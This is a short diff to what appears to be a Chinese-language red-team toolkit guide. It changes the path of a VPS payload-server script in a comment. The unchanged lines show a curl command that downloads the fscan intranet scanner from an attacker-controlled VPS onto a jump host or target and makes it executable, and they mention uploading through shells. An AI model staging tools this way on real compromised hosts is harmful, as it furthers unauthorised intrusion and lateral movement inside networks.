@@ -33,7 +33,7 @@ VPS  : http://<你的VPS_IP>:9100/fscan                     （技能 vps-revers
 **传到跳板机/目标**（内网扫描必须在能到达内网的位置执行）：
 
 ```bash
-# 跳板机上直接下载（VPS 起载荷服务：$DSH_HOME/redteam/toolkit/vps/vps.sh serve 9100）
+# 跳板机上直接下载（VPS 起载荷服务：~/.dsh/redteam/toolkit/vps/vps.sh serve 9100）
 curl -o fscan http://<你的VPS_IP>:9100/fscan && chmod +x fscan
 # 或从本机经 shells 上传
 ```
